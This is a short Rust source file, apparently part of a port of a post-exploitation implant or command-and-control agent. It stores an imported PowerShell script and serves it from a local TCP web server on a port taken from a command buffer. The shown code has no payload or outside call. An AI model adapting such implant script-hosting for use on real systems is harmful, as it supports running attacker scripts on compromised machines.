//! powershell.cpp 的移植版 — 导入的 PowerShell 脚本托管。
//! Port of powershell.cpp — imported PowerShell script hosting.

use crate::parse::DataP;
use crate::webserver::serveit;
use parking_lot::Mutex;

/// 跟踪我们导入的脚本数据（imported）。None = 尚未导入脚本。
/// Track our imported script data (imported). None = no script imported yet.
static IMPORTED: Mutex<Option<Vec<u8>>> = Mutex::new(None);

/// 导入一个我们将使用一段时间的脚本。
/// Import a script that we'll use for awhile.
pub fn command_psh_import(buffer: &[u8], length: usize) {
    let mut imported = IMPORTED.lock();

    // 分配一些内存并复制我们的数据
    // alloc some memory and copy our data over
    let mut script = Vec::with_capacity(length + 1);
    script.extend_from_slice(&buffer[..length]);
    // NUL 终止（C：imported[length] = '\0'）
    script.push(0); // NUL terminate (C: imported[length] = '\0')

    *imported = Some(script);

    // 就这样……接下来我们需要在本地 Web 服务器中提供它
    // that's it... now we'll need to serve this in a local web server
}

/// 在本地 TCP Web 服务器上托管导入的脚本。
/// Host the imported script on a local TCP web server.
pub fn command_psh_host_tcp(buffer: &[u8], length: usize) {
    let mut data = buffer[..length].to_vec();
    let mut parser = DataP::init(&mut data);
    let port = parser.data_short();

    let imported = IMPORTED.lock();
    let script = match imported.as_deref() {
        Some(s) => s,
        // 与 C 一致：if (imported == NULL) return;（未导入脚本时返回）
        None => return, // C: if (imported == NULL) return;
    };

    // 提供 strlen(imported) 字节（截至 NUL 终止符）
    // serve strlen(imported) bytes (up to the NUL terminator)
    let slen = script.iter().position(|&c| c == 0).unwrap_or(script.len());
    serveit(port, &script[..slen], slen as i32);
}
